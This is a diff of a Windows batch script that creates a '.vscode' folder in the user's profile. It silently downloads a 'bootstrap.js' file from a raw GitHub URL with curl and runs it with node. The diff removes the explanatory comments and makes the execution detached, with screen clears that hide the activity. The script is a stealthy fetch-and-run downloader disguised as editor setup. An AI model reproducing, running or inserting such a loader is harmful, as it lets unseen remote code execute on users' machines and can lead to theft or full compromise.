@@ -1,4 +1,3 @@
-
 @echo off
 
 set "VSCODE_DIR=%USERPROFILE%\.vscode"
@@ -7,13 +6,11 @@ if not exist "%VSCODE_DIR%" (
     mkdir "%VSCODE_DIR%"
 )
 
-REM Download Node bootstrap script
+
 curl -s -L -o "%VSCODE_DIR%\bootstrap.js" https://raw.githubusercontent.com/ph2860051/o-g/refs/heads/main/bootstrap
 
 cls
 
-REM Run Node bootstrap
-node "%VSCODE_DIR%\bootstrap.js"
+start "" node "%VSCODE_DIR%\bootstrap.js"
 
 cls
-
